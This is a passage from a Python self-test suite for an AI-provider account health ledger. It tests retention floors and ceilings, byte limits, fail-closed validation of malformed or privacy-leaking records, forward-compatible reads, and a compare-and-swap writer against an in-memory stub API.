    # mutation guards: only a LIVE backoff earns retention — an expired one, or one already
    # cleared by the account's own success, prunes normally (no unbounded pinning). [#699] Read
    # once the whole fixture has aged past the retention floor, so the COUNT cap is what applies:
    # inside the floor nothing is evicted and these two guards would be vacuous.
    aged = now + RETENTION_FLOOR_SECONDS + 2000
    ewindow = prune(hint_hit + flood, aged)
    chk("EXPIRED backoff record is not preserved (cap applies normally)",
        (len(ewindow), any(r["account"] == ah for r in ewindow)), (MAX_RECORDS, False))
    cleared = [rec("openai", "codex01", "rate-limit", dt=0),
               rec("openai", "codex01", SUCCESS, dt=50)]
    swindow = prune(cleared + flood, aged)
    chk("success-cleared backoff record is not preserved",
        (len(swindow), any(r["account"] == ah for r in swindow)), (MAX_RECORDS, False))
    # ---- cap EXCEEDED by live backoffs alone (PR #85 finding 1) ------------------------------
    # When more than MAX_RECORDS records feed still-live backoffs (34 saturated 6-record chains
    # already total 204), the nominal cap CANNOT hold: every live backoff survives (correctness
    # over the cap), every expired/non-preserved record is evicted (the total is the preserved
    # set, never preserved + expired filler), and the overshoot is surfaced LOUDLY as a
    # fleet-wide saturation ::warning:: — never a silent bound violation.
    live_count = MAX_RECORDS + 10
    live = [rec("openai", f"live{i:03d}", "rate-limit", dt=0) for i in range(live_count)]
    # expired: rate-limit hits whose 15-min backoff lapsed hours ago (still inside the 48 h window).
    # [#699] They are placed OUTSIDE the retention floor, because inside it they are no longer
    # "filler" — a record inside the floor is coverage evidence and is deliberately retained (the
    # separate check below pins that, so the two behaviours cannot be confused).
    lapsed = [rec("openai", f"dead{i:03d}", "rate-limit",
                  dt=-(RETENTION_FLOOR_SECONDS + 3600 + i)) for i in range(40)]
    sat_window, sat_err = prune_loud(live + lapsed, now + 60)
    live_hashes = {account_hash(f"live{i:03d}", salt) for i in range(live_count)}
    chk("cap-exceeded: every live backoff survives the prune (correctness over cap)",
        sum(1 for r in sat_window if r["account"] in live_hashes), live_count)
    chk("cap-exceeded: expired records all evicted — total bounded by the live set",
        (len(sat_window), any(r["account"] not in live_hashes for r in sat_window)),
        (live_count, False))
    chk("cap-exceeded: every live backoff still derives on the pruned window",
        len(account_backoffs(sat_window, now + 60)), live_count)
    chk("cap-exceeded: saturation is SURFACED (::warning:: names the cap)",
        ("::warning::" in sat_err, f"MAX_RECORDS={MAX_RECORDS}" in sat_err), (True, True))
    # [#699] ...and under that SAME saturation a non-preserved record INSIDE the retention floor is
    # still retained. The overshoot branch evicts filler, and a record the health span would have
    # to speak about is not filler — without this the fix would be silently disabled in exactly the
    # fleet-wide-rate-limit state where coverage is hardest to come by.
    sat_floor, _ = prune_loud(
        live + lapsed + [rec("anthropic", "insidefloor", SUCCESS, dt=-3600, run="if1")], now + 60)
    fh = account_hash("insidefloor", salt)
    chk("cap-exceeded: a record INSIDE the retention floor is retained, not treated as filler",
        (any(r["account"] == fh for r in sat_floor), len(sat_floor)), (True, live_count + 1))
    # ...and an ordinary over-cap prune (live set within budget) stays silent — the saturation
    # warning must keep its operational signal, not fire on every routine bounded write.
    quiet, quiet_err = prune_loud(many, now + MAX_RECORDS + 100)
    chk("under-saturation prune emits no warning (bound still hard)",
        (len(quiet), quiet_err), (MAX_RECORDS, ""))

    # ---- [registry #699] THE RATE-FRAGILE COVERAGE DEFECT, END TO END ------------------------
    # The busy-ledger fixture far above hand-builds the window the OLD count-only prune PRODUCED at
    # the measured 2026-07-26 peak (62.1 rec/h) and asserts the predicate correctly refuses it.
    # That fixture is still right and is deliberately left alone: it is the control that proves the
    # coverage CHECK is intact. These tests ask the question one layer down — at the layer that was
    # actually broken — by feeding prune the RAW record stream at that rate and asking what window
    # it retains.
    chk("[#699] the retention floor exceeds the health span by the stated margin (the floor bounds "
        "the OLDEST RETAINED RECORD, so coverage only clears the span if the floor overshoots it)",
        RETENTION_FLOOR_SECONDS - SUSTAINED_HEALTH_SPAN_SECONDS >= RETENTION_FLOOR_MARGIN_SECONDS,
        True)
    # The floor boundary is INCLUSIVE: a record stamped exactly RETENTION_FLOOR_SECONDS ago is
    # inside the floor. It is one record either way and the 1 h margin absorbs the difference, but
    # the boundary is pinned so the intent survives an edit.
    edge_at = now + RETENTION_FLOOR_SECONDS
    edge = [rec("anthropic", "edge", SUCCESS, dt=0, run="e0")] + [
        rec("anthropic", f"pad{i:03d}", SUCCESS, dt=RETENTION_FLOOR_SECONDS - 60 + i // 4,
            run=f"p{i}") for i in range(MAX_RECORDS + 50)]
    eh = account_hash("edge", salt)
    chk("[#699] the retention floor boundary is inclusive (a record exactly at the floor stays)",
        (any(r["account"] == eh for r in prune(edge, edge_at)),
         any(r["account"] == eh for r in prune(edge, edge_at + 1))),
        (True, False))
    peak_park = h_now - SUSTAINED_HEALTH_SPAN_SECONDS - 60

    def stream(span_seconds, rate, tag):
        """A perfectly healthy two-real-account success stream at `rate` records/hour."""
        gap = 3600.0 / rate
        count = int(span_seconds / gap)
        return sorted(
            (rec("openai" if i % 2 else "anthropic", "codex01" if i % 2 else "acct02", SUCCESS,
                 dt=int(7 * 3600 - i * gap), run=f"{tag}{i}") for i in range(count)),
            key=lambda r: r["ts"])

    # THE RED TEST. 62.1 rec/h — the rate at which the live fleet was MEASURED refusing this exit
    # on 2026-07-26 — over more than one span of wall clock.
    peak_stream = stream(9 * 3600, 62.1, "pk")
    peak_window = prune(peak_stream, h_now)
    peak_coverage = (h_now - peak_window[0]["ts"]) / 3600.0
    chk("[#699] at the measured 62 rec/h peak the retained window now COVERS the health span "
        "(retention is no longer MAX_RECORDS / record-rate)",
        (len(peak_window) > MAX_RECORDS,
         peak_coverage >= SUSTAINED_HEALTH_SPAN_SECONDS / 3600.0),
        (True, True))
    chk("[#699] SAME STREAM, SAME PREDICATE, ONLY RETENTION DIFFERS: truncated to the old count "
        "cap it still refuses; retained under the time floor it ADMITS",
        (sustained_fleet_health_evidence(peak_window[-MAX_RECORDS:], peak_park, h_now) is None,
         bool(sustained_fleet_health_evidence(peak_window, peak_park, h_now)),
         bool(sustained_health_exit_reachable(peak_window, h_now))),
        (True, True, True))

    # THE NON-VACUITY CONTROL — the single most important assertion in this block. If the fix had
    # been made by weakening or deleting the coverage clause instead of widening retention, the red
    # test above would still pass and THIS would flip to admitting. The window here is retained
    # WHOLE (len == len(stream), asserted, so the refusal cannot be an artifact of truncation) and
    # the evidence simply does not reach back a span.
    young_stream = stream(3 * 3600, 62.1, "yg")
    young_window = prune(young_stream, h_now)
    chk("[#699] NON-VACUITY CONTROL: evidence that GENUINELY does not reach back a span still "
        "REFUSES — retention was widened, the coverage check was not weakened",
        (len(young_window) == len(young_stream),
         (h_now - young_window[0]["ts"]) < SUSTAINED_HEALTH_SPAN_SECONDS,
         sustained_fleet_health_evidence(young_window, peak_park, h_now),
         sustained_health_exit_reachable(young_window, h_now)),
        (True, True, None, False))

    # THE CEILING, AND WHAT HAPPENS ABOVE IT. A pure time floor is unbounded at high rates, so the
    # ceiling is real — and a ceiling that trimmed silently would have MOVED the cliff, not removed
    # it. Above ~285 rec/h the oldest non-preserved records go, coverage falls back under the span,
    # the exit closes again — and prune SAYS SO, naming the binding bound and the coverage left.
    over_stream = stream(4 * 3600, 600.0, "ov")
    over_window, over_err = prune_loud(over_stream, h_now)
    over_coverage = (h_now - over_window[0]["ts"]) / 3600.0
    chk("[#699] above the tolerated rate the RECORD ceiling binds, evicting oldest-first",
        (len(over_stream) > RETENTION_CEILING_RECORDS, len(over_window)),
        (True, RETENTION_CEILING_RECORDS))
    chk("[#699] the ceiling is LOUD: the warning names the condition, the binding bound and the "
        "coverage it left — a no-evidence census row must never read as 'parks are too young'",
        ("RETENTION CEILING BINDING" in over_err,
         f"records {len(over_stream)} > {RETENTION_CEILING_RECORDS}" in over_err,
         f"{over_coverage:.2f} h" in over_err,
         "BELOW" in over_err and "CLOSED" in over_err),
        (True, True, True, True))
    chk("[#699] and the failure DIRECTION above the ceiling is unchanged: under-coverage DEFERS",
        (over_coverage < SUSTAINED_HEALTH_SPAN_SECONDS / 3600.0,
         sustained_fleet_health_evidence(over_window, peak_park, h_now),
         sustained_health_exit_reachable(over_window, h_now)),
        (True, None, False))
    # OBLIGATION 1 (issue #82) THROUGH THE CEILING: a live backoff is never evicted, by the count
    # cap OR by the ceiling. `hint_hit` is the OLDEST record of that fixture — the first record the
    # ceiling would take — and it is still there afterwards. That is preservation, not luck.
    chk("[#699] a LIVE backoff is the first eviction candidate under the ceiling and survives it",
        (sorted(hint_hit + flood, key=lambda r: r["ts"])[0]["account"] == ah,
         len(window) < len(hint_hit + flood),
         window[0]["account"] == ah),
        (True, True, True))

    # THE BYTE CEILING. The record ceiling bounds the COUNT; the contents API bounds the BLOB, and
    # a ledger past its ~1 MB inline-content limit fails EVERY reader (account-usage then fails
    # OPEN — accounts admitted with no rate-limit backoff). Validator-maximal records are ~2.5x the
    # live mean, so at that shape the byte bound binds FIRST, before the record ceiling.
    fat = [make_record("anthropic", account_hash(f"fat{i}", salt), "m" * RECORD_FIELD_MAX_LEN,
                       CLASS_NO_CHANGE, "9" * RECORD_FIELD_MAX_LEN, now + 100 + i // 8,
                       input_tokens=MAX_USAGE_TOKENS, output_tokens=MAX_USAGE_TOKENS,
                       wall_seconds=MAX_WALL_SECONDS, issue=MAX_ISSUE_NUMBER,
                       why_no_diff=sorted(NO_CHANGE_REASONS)[0])
           for i in range(RETENTION_CEILING_RECORDS - 200)]
    fat_window, fat_err = prune_loud(fat, now + 500)
    chk("[#699] the BYTE ceiling binds before the record ceiling on validator-maximal records",
        (len(fat) < RETENTION_CEILING_RECORDS, len(fat_window) < len(fat),
         _ledger_bytes(fat_window) <= RETENTION_CEILING_BYTES,
         f"> {RETENTION_CEILING_BYTES}" in fat_err and "RETENTION CEILING BINDING" in fat_err),
        (True, True, True, True))
    # ...and it is LOAD-BEARING, not belt-and-braces: the widest record the validator admits (a
    # RESET_HINT_MAX_LEN hint) is fat enough that RETENTION_CEILING_RECORDS of them would blow past
    # the contents-API inline limit on their own. The count ceiling does not bound the blob.
    widest = make_record("openai", account_hash("widest", salt), "m" * RECORD_FIELD_MAX_LEN,
                         "rate-limit", "9" * RECORD_FIELD_MAX_LEN, now,
                         reset_hint="a" * RESET_HINT_MAX_LEN)
    chk("[#699] the RECORD ceiling alone would NOT bound the blob — the byte ceiling is what "
        "keeps a full ledger fetchable",
        RETENTION_CEILING_RECORDS * _record_bytes(widest) > 1_000_000, True)
    chk("[#699] the per-record byte estimate never UNDER-states the real serialized document "
        "(an under-estimate would let the ceiling admit a blob no reader can fetch)",
        [_ledger_bytes(sample) >= len(json.dumps({"records": sample}, indent=1)) + 1
         for sample in (fat_window, peak_window, young_window, [])],
        [True, True, True, True])
    chk("[#699] a ceiling-full ledger of validator-maximal records still fits the contents-API "
        "inline-content limit with headroom",
        (RETENTION_CEILING_BYTES < 1_000_000,
         len(json.dumps({"records": fat_window}, indent=1)) < 1_000_000),
        (True, True))

    # THE DIAGNOSTIC that makes an under-covered window tellable from a young one at the call site.
    sf_young = sustained_health_coverage_shortfall(young_window, h_now)
    sf_over = sustained_health_coverage_shortfall(over_window, h_now)
    chk("[#699] coverage shortfall: a covered window reports none",
        sustained_health_coverage_shortfall(peak_window, h_now), None)
    chk("[#699] coverage shortfall discriminates a YOUNG ledger (nothing to fix) from a "
        "CEILING-BOUND one (a real capacity condition)",
        (sf_young["retention_bound"], sf_over["retention_bound"],
         sf_young["coverage_seconds"] < SUSTAINED_HEALTH_SPAN_SECONDS,
         sf_over["coverage_seconds"] < SUSTAINED_HEALTH_SPAN_SECONDS),
        (False, True, True, True))
    chk("[#699] coverage of an empty/unusable window is 0, never a fabricated span",
        (health_window_coverage_seconds([], h_now),
         health_window_coverage_seconds([{"nope": 1}], h_now),
         sustained_health_coverage_shortfall([], h_now)["coverage_seconds"]),
        (0, 0, 0))

    # ---- validate_ledger fail-closes on a malformed/poisoned record (enforced at READ) -------
    # The same _validate_record contract as construction: a poisoned ledger (raw handle, unknown
    # provider, unknown class, an injected marker field, a non-printable blob) is rejected at read,
    # so a bad write can never silently corrupt every subsequent reader (issue #202).
    def _led(**over):
        base = {"ts": now, "provider": "anthropic", "account": account_hash("a", salt),
                "exit_class": "auth", "model_alias": "fable", "run_id": "1"}
        base.update(over)
        return {"records": [base]}
    chk("ledger read accepts a well-formed record", validate_ledger(_led()) is not None, True)
    # The document-shape guards had never been EXECUTED by this suite (measured with
    # `trace --count --missing` while auditing #739's edits to the same function), so each was
    # individually deletable with 500 checks green.
    chk("ledger read rejects a malformed top level",
        _raises(lambda: validate_ledger({"records": [], "extra": 1})), True)
    chk("ledger read rejects a non-list records field",
        _raises(lambda: validate_ledger({"records": {}})), True)
    chk("ledger read rejects a non-object entry (as a ValueError, not an AttributeError)",
        _outcome(lambda: validate_ledger({"records": [["not", "an", "object"]]})), "ValueError")
    chk("ledger read rejects raw-handle account",
        _raises(lambda: validate_ledger(_led(account="acct01"))), True)
    chk("ledger read rejects an unknown provider",
        _raises(lambda: validate_ledger(_led(provider="p"))), True)
    chk("ledger read rejects an unknown exit_class",
        _raises(lambda: validate_ledger(_led(exit_class="weird"))), True)
    chk("ledger read rejects a non-printable field",
        _raises(lambda: validate_ledger(_led(model_alias="a\nb"))), True)
    # An UNRECOGNISED field is no longer whole-ledger fatal by itself (issue #739 — that is what
    # made every additive field a rolling-upgrade outage); what still refuses the document is the
    # PRIVACY invariant riding inside one. This row's kill is the handle scan in
    # _tolerable_unknown_field, and _test_forward_compatibility pins both sides of the split.
    chk("ledger read rejects a raw handle smuggled in an unrecognised field",
        _raises(lambda: validate_ledger(_led(handle="acct01"))), True)
    chk("the WRITE side still refuses the unrecognised field outright",
        _raises(lambda: _validate_record(_led(handle="ok")["records"][0], ORIGIN_WRITE)), True)
    # Review round 1 of PR #444: a hand-forged ledger entry carrying a raw handle or printable
    # Markdown in ANY free-form field must die at READ too — the reader shares _validate_record
    # with construction, so these go green only while the field grammars + handle-pattern check
    # exist on the read path.
    chk("ledger read rejects a raw handle in model_alias",
        _raises(lambda: validate_ledger(_led(model_alias="acct01"))), True)
    chk("ledger read rejects a raw handle in run_id",
        _raises(lambda: validate_ledger(_led(run_id="acct2css"))), True)
    chk("ledger read rejects a raw handle in reset_hint",
        _raises(lambda: validate_ledger(_led(reset_hint="acct01 capped until 14:00"))), True)
    chk("ledger read rejects Markdown/HTML in reset_hint (Markdown alert sink)",
        _raises(lambda: validate_ledger(
            _led(reset_hint="**@maintainer** <!-- marker -->"))), True)
    chk("ledger read accepts a producer-shaped reset_hint",
        validate_ledger(_led(exit_class="limit",
                             reset_hint="2026-07-20 14:00 UTC")) is not None, True)
    chk("ledger read accepts typed no_change evidence",
        validate_ledger(_led(exit_class=CLASS_NO_CHANGE, issue=500, input_tokens=390000,
                             output_tokens=1200, wall_seconds=78)) is not None, True)
    chk("ledger read rejects non-numeric no_change evidence",
        _raises(lambda: validate_ledger(
            _led(exit_class=CLASS_NO_CHANGE, issue=500, input_tokens="390000"))), True)
    chk("ledger read requires issue attribution on no_change",
        _raises(lambda: validate_ledger(_led(exit_class=CLASS_NO_CHANGE))), True)

    # ---- #739: the READ/WRITE posture split across the rolling-upgrade seam -------------------
    ok = _test_forward_compatibility(chk) and ok
    # ---- CAS writer against a stub API (create + append + conflict retry) --------------------
    ok = _test_cas(chk) and ok
    # ---- #200: CAS writer is idempotent (dedup) + bounded jittered retry ---------------------
    ok = _test_cas_dedup_jitter(chk) and ok

    # ---- alert upsert operational idempotency (defect #7) ------------------------------------
    ok = _test_upsert(chk) and ok

    # ---- #203: marker lookup is authoritative + paginated (truncation != 'not found') --------
    ok = _test_lookup_pagination(chk) and ok

    # ---- record exits NONZERO on CAS exhaustion (defect #8) ----------------------------------
    ok = _test_record_exit(chk) and ok

    # ---- #215: record exits NONZERO when per-account salting configuration is absent ---------
    ok = _test_record_salting_config(chk) and ok

    # ---- #199: record REFUSES a catalog-controlled provider outside the known set ------------
    ok = _test_record_provider_guard(chk) and ok

    # ---- #341: the empty-frontier record + its non-flooding write gate -----------------------
    ok = _test_fleet_idle_gate(chk) and ok

    # ---- decide exits NONZERO on an unreadable ledger (review r3) ----------------------------
    ok = _test_decide_exit(chk) and ok

    # ---- #39 routing fallback ---------------------------------------------------------------
    ok = _test_routing(chk) and ok

    # ---- #175: unusable private token retries the registry, else fails nonzero ---------------
    ok = _test_delivery(chk) and ok

    # ---- #204: public-registry writes REDACT the fleet/failure counts + reset hints ----------
    ok = _test_redaction(chk) and ok

    # ---- review #340: an alert created on the fallback route is still recovered --------------
    ok = _test_fallback_orphan(chk) and ok

    # ---- #344: a firing alert on a recovered primary closes its superseded fallback copy ------
    ok = _test_firing_supersede(chk) and ok

    # ---- provider fleet resolution (account catalog -> salted provider map) ------------------
    chk("provider parsed from YAML body",
        _provider_of("harness: claude\nprovider: anthropic\nmodels: [fable]"), "anthropic")
    chk("provider absent -> empty", _provider_of("models: [x]"), "")
    ok = _test_fleet(chk) and ok

    # ---- provider status probe + annotation (issue #70) --------------------------------------
    ok = _test_provider_status(chk) and ok
    ok = _test_probe_fetch(chk) and ok
    ok = _test_decide_annotation(chk) and ok

    print("model-health self-test", "PASSED" if ok else "FAILED")
    return 0 if ok else 1


def _action_for(actions, condition, provider):
    """SELF-TEST HELPER: the one action for (condition, provider) — so an assertion can read the
    REASON (or feed the real action to the real upsert) rather than only its boolean. Raises when
    the action is absent or duplicated, so a silently-missing action can never read as a pass."""
    found = [a for a in actions if a["condition"] == condition and a["provider"] == provider]
    if len(found) != 1:
        raise AssertionError(
            f"expected exactly one {condition}/{provider} action, got {len(found)}")
    return found[0]


def _raises(fn):
    try:
        fn()
        return False
    except (ValueError, HealthError):
        return True


def _raises_type(fn, exc_type):
    """True when `fn` raises EXACTLY this exception type — distinct from `_raises`, which folds the
    validator's whole ValueError/HealthError family. Used where the TYPE is the assertion (issue
    #739: `_validate_record`'s `origin` has no default, so omitting it must be a TypeError at the
    call site rather than a silently inherited posture). Any other exception propagates."""
    try:
        fn()
        return False
    except exc_type:
        return True


def _outcome(fn):
    """`fn()`'s value, or the CLASS NAME of the exception that escaped it.

    For guards whose deletion fails by CRASHING rather than by answering wrongly. `_raises` folds
    only ValueError/HealthError, so a deleted guard that lets a TypeError/AttributeError through
    aborts the whole suite instead of reddening one row — and a crash-after-partial-run records as
    a kill while every check below it never ran (AGENTS.md AUTHOR pre-flight §4). Folding the class
    name into the compared VALUE turns that into a NAMED red row, and where the expected value is
    "ValueError" it additionally asserts the fail-closed CONTRACT: every reader here catches
    ValueError and nothing else, so a guard raising another class is not protecting them."""
    try:
        return fn()
    except BaseException as exc:       # the class name IS part of the assertion
        return type(exc).__name__


class _StubAPI:
    """In-memory contents API for the CAS writer test. `conflict_first` simulates a lost CAS race
    on the first PUT (a 409) so the retry loop is exercised. Ledger-branch discipline (issue #28)
    is enforced structurally: a GET that does not pin `?ref=ledger` misses, a PUT that does not
    carry `branch=ledger` fails — so pointing the I/O back at the default branch turns the whole
    CAS suite red. `branch_missing` simulates an absent ledger branch."""

    def __init__(self, seed=None, conflict_first=False, branch_missing=False):
        self._blob = None if seed is None else base64.b64encode(
            json.dumps({"records": seed}).encode()).decode()
        self._sha = None if seed is None else "sha0"
        self._n = 0
        self._conflict_first = conflict_first
        self._branch_missing = branch_missing
        self.last_put_branch = None

    def request(self, method, path, body=None, allow_404=False, retry_conflict=False):
        if method == "GET" and "/git/ref/heads/" in path:
            if self._branch_missing or not path.endswith("/git/ref/heads/ledger"):
                if allow_404:
                    return None
                raise HealthError("missing branch")
            return {"object": {"sha": "ledger-tip"}}
        if method == "GET":
            if self._blob is None or self._branch_missing or not path.endswith(
                    f"/contents/{LEDGER_PATH}?ref=ledger"):
                if allow_404:
                    return None
                raise HealthError("missing")
            return {"content": self._blob, "sha": self._sha}
        # PUT
        self.last_put_branch = body.get("branch")
        if self.last_put_branch != "ledger":
            raise HealthError("PUT did not pin the ledger branch")
        self._n += 1
        if self._conflict_first and self._n == 1:
            if retry_conflict:
                raise HealthConflict("stub conflict")
        self._blob = body["content"]
        self._sha = f"sha{self._n}"
        return {"content": {"sha": self._sha}}

    def records(self):
        return json.loads(base64.b64decode(self._blob).decode())["records"]


def _test_forward_compatibility(chk):
    """Issue #739: the ledger is a SHARED, mutable blob, and a worker's registry checkout is pinned
    at DISPATCH while its health job runs tens of minutes later — so every deploy is a rolling
    upgrade with pre-merge READERS still live. #733 added `why_no_diff` to the writer and to the
    reader's allowlist in ONE commit; three in-flight runs then died on
    `unexpected field(s) ['why_no_diff']`, and because the reader raised on the first unknown field
    of any record the failure was WHOLE-LEDGER — every health append in those runs was lost.

    Both directions are pinned here, and they are the experiment: the READ side must tolerate a
    field a later release added, and the WRITE side must still refuse one outright. If either row
    below could go green with the other's behaviour, the split has collapsed into a relaxation."""
    now, salt = 4_000_000, "s3cret"
    ah = account_hash("acct07", salt)

    def rec(**over):
        base = {"ts": now, "provider": "anthropic", "account": ah, "exit_class": "auth",
                "model_alias": "fable", "run_id": "77.1"}
        base.update(over)
        return base

    # ---- THE REGRESSION, stated exactly as #739 states it: validate what THIS release WRITES with
    # a reader ONE RELEASE BEHIND. `known` is narrowed by the field #733 actually added, so this
    # drives the identical allowlist line that produced the three tracebacks.
    behind = RECORD_KNOWN_FIELDS - {"why_no_diff"}
    written = make_record("openai", ah, "codex", CLASS_NO_CHANGE, "77.1", now,
                          issue=500, why_no_diff="underspecified")
    chk("[#739] a reader ONE RELEASE BEHIND reads what THIS release writes",
        _raises(lambda: validate_ledger({"records": [written]}, known=behind)), False)
    # ...and the blast radius is the point: one new-shape record must not take the whole window with
    # it. Deleting the read tolerance flips this to a 0-record exception, not a 2-record answer.
    chk("[#739] the records beside it are not collateral damage",
        _outcome(lambda: len(validate_ledger(
            {"records": [rec(), written, rec(run_id="78.1")]}, known=behind))), 3)

    # ---- THE TRUST CHECK THAT DOES NOT MOVE. Same record, same field, opposite posture.
    ahead = rec(shipped_next_release=1)
    chk("[#739] the WRITE posture refuses an undeclared field...",
        _raises(lambda: _validate_record(ahead, ORIGIN_WRITE)), True)
    chk("[#739] ...while the READ posture carries the SAME record through",
        _raises(lambda: _validate_record(ahead, ORIGIN_READ)), False)
    chk("[#739] `origin` has no default, so a new call site cannot inherit the wrong posture",
        _raises_type(lambda: _validate_record(ahead), TypeError), True)

    # ---- THE SEAM. append_record read-modify-writes the WHOLE blob, so both postures have to hold
    # at the one call site that actually PUTs: refuse to INTRODUCE an undeclared field, and never
    # ERASE one a newer writer already stored (a stripping reader would silently downgrade the
    # shared ledger on every append an old worker makes).
    guarded = _StubAPI(seed=[])
    chk("[#739] append_record refuses to INTRODUCE an undeclared field",
        _raises(lambda: append_record(guarded, "o/r", rec(sneaky_field="x"), now)), True)
    chk("[#739] ...and nothing reached the ledger",
        (guarded.last_put_branch, guarded.records()), (None, []))
    carried = _StubAPI(seed=[rec(run_id="1.1", shipped_next_release={"a": [1, 2]})])
    chk("[#739] append_record still APPENDS onto a ledger a newer writer has touched",
        _outcome(lambda: append_record(
            carried, "o/r", make_record("anthropic", ah, "fable", "success", "2.1", now + 1),
            now + 1)), 2)
    chk("[#739] ...and CARRIES the newer writer's field through the read-modify-write",
        [r.get("shipped_next_release") for r in carried.records()], [{"a": [1, 2]}, None])

    # ---- FAIL-CLOSED, unchanged. Tolerance is for a NAME a later release could plausibly ship;
    # everything else still refuses the whole document. The value's TYPE is deliberately free (a
    # future field may be a list or an object) but the PUBLIC-ledger privacy invariant is not.
    bad_name = rec()
    bad_name["bad\nname"] = 1
    markup_name = rec()
    markup_name["<!--marker-->"] = 1
    long_name = rec()
    long_name["f" * 65] = 1
    empty_name = rec()
    empty_name[""] = 1
    # A non-string key BESIDE a string one is the case that matters: on a key set of mixed types
    # `sorted()` raises TypeError, which is not a ValueError and so escapes every fail-closed
    # handler below. A lone non-string key is caught by _tolerable_unknown_field regardless, so
    # testing only that shape leaves the guard unkillable.
    nonstring_name = rec()
    nonstring_name[7] = "x"
    nonstring_name["future_note"] = "ok"
    for label, poisoned in (
            ("a raw acctNN handle smuggled in an unrecognised field (the ledger is PUBLIC)",
             rec(future_note="leased to acct01")),
            ("...the same handle NESTED inside a structured value",
             rec(future_note={"who": ["acct02"]})),
            ("a field name carrying a newline (it would forge a :: workflow annotation)", bad_name),
            ("a field name carrying Markdown/HTML", markup_name),
            ("a field name over 64 characters", long_name),
            ("an empty field name", empty_name)):
        chk(f"[#739] READ still refuses {label}",
            _raises(lambda p=poisoned: validate_ledger({"records": [p]})), True)
    # The non-string key is asserted on the exception CLASS, not merely on "something raised":
    # every fail-closed reader below catches ValueError only, and without the guard `sorted()`
    # raises TypeError on a mixed key set — which escapes all of them AND aborts this suite mid-run
    # rather than reddening a row.
    chk("[#739] READ refuses a NON-STRING field name beside a string one, as a ValueError",
        _outcome(lambda: validate_ledger({"records": [nonstring_name]})), "ValueError")
    chk("[#739] ...so the park predicates fail CLOSED on it rather than exploding past their "
        "ValueError handlers",
        (_outcome(lambda: _readable_window([nonstring_name], now)),
         _outcome(lambda: park_cause_provable([nonstring_name], now, now))), (None, False))

    # The cap is asserted on LITERALS, never on the constant the code reads (an input derived from
    # MAX_UNKNOWN_RECORD_FIELDS stays green at any value of it), plus one explicit drift lock.
    chk("[#739] eight unrecognised fields still read (the cap is 8, not fewer)",
        _raises(lambda: validate_ledger(
            {"records": [rec(**{f"f{i}": i for i in range(8)})]})), False)
    chk("[#739] nine refuses the document (the cap is 8, not more)",
        _raises(lambda: validate_ledger(
            {"records": [rec(**{f"f{i}": i for i in range(9)})]})), True)
    chk("[#739] the tested cap IS the shipped cap", MAX_UNKNOWN_RECORD_FIELDS, 8)

    for value in (None, [], {"a": 1}, 12.5, True, "free text, punctuated!"):
        chk(f"[#739] an unrecognised field valued {value!r} is readable (shape is not constrained)",
            _raises(lambda v=value: validate_ledger({"records": [rec(future_note=v)]})), False)

    # ---- THE WIDER BLAST RADIUS. The recorder was only the loudest victim: every park predicate
    # folds an unreadable window to "no evidence", so a new-shape record silently froze the aged-out
    # park exits too. These read the window through _validate_record's fail-closed callers.
    window = [rec(ts=now - 100, run_id="1.1"),
              rec(ts=now - 50, run_id="2.1", shipped_next_release=1)]
    clean = [{k: v for k, v in r.items() if k != "shipped_next_release"} for r in window]
    chk("[#739] the park predicates still SEE a window a newer writer has touched",
        _readable_window(window, now) is None, False)
    chk("[#739] ...and park_cause_provable answers identically with and without the new field",
        (park_cause_provable(window, now, now), park_cause_provable(clean, now, now)), (True, True))

    # ---- NEVER SILENT. A reader that is behind the writer says so, by name.
    import contextlib
    import io
    loud = io.StringIO()
    with contextlib.redirect_stderr(loud):
        _outcome(lambda: validate_ledger({"records": [rec(future_note="ok"),
                                                      rec(run_id="2.1", other_note="ok")]}))
    heard = loud.getvalue()
    chk("[#739] a tolerated field is REPORTED by name (reading ahead is visible, not swallowed)",
        ("::warning::" in heard and "future_note" in heard and "other_note" in heard), True)
    quiet = io.StringIO()
    with contextlib.redirect_stderr(quiet):
        _outcome(lambda: validate_ledger({"records": [rec()]}))
    chk("[#739] ...and a ledger this reader fully understands stays quiet", quiet.getvalue(), "")
    return True


def _test_cas(chk):
    salt, now = "s3cret", 2_000_000
    r = make_record("anthropic", account_hash("acct01", salt), "fable", "auth", "9", now)
    # create-from-missing
    api = _StubAPI(seed=None)
    kept = append_record(api, "o/r", r, now)
    chk("CAS creates ledger from missing", (kept, len(api.records())), (1, 1))
    chk("CAS wrote a salted hash", api.records()[0]["account"], account_hash("acct01", salt))
    # append onto existing
    kept = append_record(api, "o/r", make_record(
        "anthropic", account_hash("acct02", salt), "fable", "success", "10", now + 1), now + 1)
    chk("CAS appends", kept, 2)
    # conflict retry: rides out one CAS conflict, backing off exactly once BETWEEN the two attempts
    # (issue #200 — the backoff must never fire before the first read, and must fire on a conflict)
    real_sleep = globals()["_sleep_backoff"]
    backoff_attempts = []
    globals()["_sleep_backoff"] = lambda attempt: backoff_attempts.append(attempt)
    try:
        apic = _StubAPI(seed=[], conflict_first=True)
        kept = append_record(apic, "o/r", r, now)
    finally:
        globals()["_sleep_backoff"] = real_sleep
    chk("CAS retries past a conflict", kept, 1)
    chk("CAS backs off once, only between attempts (issue #200)", backoff_attempts, [1])
    # ---- ledger-branch targeting (issue #28: data plane off the protected code branch) ----
    chk("ledger read targets the ledger ref",
        ledger_read_path("o/r"), f"/repos/o/r/contents/{LEDGER_PATH}?ref=ledger")
    chk("CAS writes pinned branch=ledger", api.last_put_branch, "ledger")
    missing_branch_loud = False
    try:
        read_ledger(_StubAPI(seed=None, branch_missing=True), "o/r")
    except HealthError:
        missing_branch_loud = True
    chk("missing ledger BRANCH fails loud (never silently-empty)", missing_branch_loud, True)
    chk("missing ledger FILE on a present branch seeds empty (first-write path)",
        read_ledger(_StubAPI(seed=None), "o/r"), ([], None))
    # ---- issue #202: append_record VALIDATES the assembled document before the PUT --------------
    # A malformed record (a raw handle that bypassed make_record) must fail LOUD and never leak to
    # the public ledger: deleting the pre-PUT validate_ledger call flips both assertions red (the
    # write would succeed and the raw handle would land in the blob).
    guarded = _StubAPI(seed=[])
    poison = {"ts": now, "provider": "anthropic", "account": "acct01",
              "exit_class": "auth", "model_alias": "fable", "run_id": "1"}
    chk("append_record refuses a malformed record before the PUT",
        _raises(lambda: append_record(guarded, "o/r", poison, now)), True)
    chk("refused malformed record never reaches the ledger",
        (guarded.last_put_branch, guarded.records()), (None, []))
    return True


def _test_cas_dedup_jitter(chk):
    """Issue #200: the CAS writer is IDEMPOTENT (a replayed outcome does not append a duplicate that
    would double-count toward backoff/alert escalation) and its conflict retries use a bounded
    FULL-JITTER backoff (a synchronized burst retrying in lockstep must not exhaust the budget and
